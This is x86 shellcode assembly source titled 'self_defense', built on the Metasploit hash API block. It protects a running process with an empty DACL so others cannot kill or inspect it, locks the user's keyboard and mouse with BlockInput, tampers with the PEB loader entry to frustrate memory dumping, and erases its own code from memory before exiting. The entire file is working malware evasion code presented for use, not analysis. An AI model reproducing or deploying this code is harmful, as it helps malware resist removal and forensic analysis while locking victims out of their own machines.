[BITS 32]
[ORG 0]

	; Protect Current Process 
self_defense:
	cld                        ; Clear direction flags
    call start          
	%include "./blocks/block_api.asm"; Stephen Fewer's hash API from metasploit project
start:
    pop ebp                    ; Pop the address of SFHA
    push 0x62C64749            ; hash(kernel32.dll, GetCurrentProcessId())
    call ebp                   ; GetCurrentProcessId()
    push eax                   ; Process ID
    push 0x00000000            ; FALSE
    push 0x1F0FFF              ; PROCESS_ALL_ACCESS
    push 0x50B695EE            ; hash(kernel32.dll, OpenProcess)
    call ebp                   ; OpenProcess(PROCESS_ALL_ACCESS,FALSE,ECX)
    mov ebx, eax               ; Move process handle to ebx
    push 0x00000000            ; 0,0
    push 0x32336970            ; pi32
    push 0x61766461            ; adva 
    push esp                   ; Push the address of "advapi32" string
    push 0x0726774C            ; hash(kernel32.dll, LoadLibraryA)
    call ebp                   ; LoadLibraryA("advapi32")
    push 0x00503a44            ; "D:P"
    sub esp,4                  ; Push the address of "D:P" string to stack
    push 0x00000000            ; FALSE
    lea eax, [esp+4]           ; Load the address of 4 byte buffer to EAX
    push eax                   ; Push the 4 byte buffer address
    push 0x00000001            ; SDDL_REVISION_1 
    lea eax, [esp+16]          ; Load the address of "D:P" string to EAX
    push eax                   ; Push the EAX value
    push 0xDA6F639A            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)
    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor("D:P",SDDL_REVISION_1,FALSE) 
    push 0x00000004            ; DACL_SECURITY_INFORMATION
    push ebx                   ; Process Handle
    push 0xD63AF8DB            ; hash(kernel32.dll, SetKernelObjectSecurity)
    call ebp                   ; SetKernelObjectSecurity(ProcessHandle,DACL_SECURITY_INFORMATION,SecurityDescriptor)
	
	; BlockInput(TRUE)
	push 0x00006c6c                 ; 0x00,ll
	push 0x642e3233                 ; d.23
	push 0x72657375                 ; resu
	push esp                        ; &"user32.dll"
	push 0x0726774C                 ; hash("KERNEL32.dll", "LoadLibraryA")
	call ebp                        ; LoadLibraryA("user32.dll")
	push dword 0x1                  ; TRUE
	push 0x46670AAE                 ; hash(USER32.dll, BlockInput)
	call ebp                        ; BlockInput(TRUE)
	push 0x0000006c                 ; 0x00,l
	push 0x6c642e6c                 ; ld.l
	push 0x6c64746e                 ; ldtn
	push esp                        ; &"ntdll.dll"
	push 0x0726774C                 ; hash("KERNEL32.dll", "LoadLibraryA")
	call ebp                        ; LoadLibraryA("ntdll.dll")
	push 0x00000064                 ; 0x00,d
	push 0x61657268                 ; aerh
	push 0x54726573                 ; Tres
	push 0x55746978                 ; Utix
	push 0x456c7452	                ; EltR
	push esp                        ; &"RtlExitUserThread"
	push eax                        ; HANDLE (KERNEL32.dll)
	push 0x7802F749                 ; hash("KERNEL32.dll", "GetProcAddress")
	call ebp                        ; GetProcAddress(HANDLE, "RtlExitUserThread")
	mov ebp,eax                     ; Save the RtlExitUserThread address to EDI
	; PEB manipulation
  	xor eax,eax           	        ; Zero EAX (upper 3 bytes will remain zero until function is found)
  	mov ebx,[fs:eax+0x30] 	        ; Get a pointer to the PEB
  	mov ebx,[ebx+0x0C]              ; Get PEB->Ldr	
	mov eax,[ebx + 0x0C]            ; InOrderModuleList
	mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage
	; Wipe self defense shellcode
total_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label
	mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX
	call $+5
	pop eax
clean:
	mov byte [eax],0x00             ; Wipe 1 byte
	dec eax                         ; Increase index
	loop clean                      ; Loop until all shellcode cleared from memory
	push 0x00                       ; NULL              
	call ebp                        ; RtlExitUserThread(0)
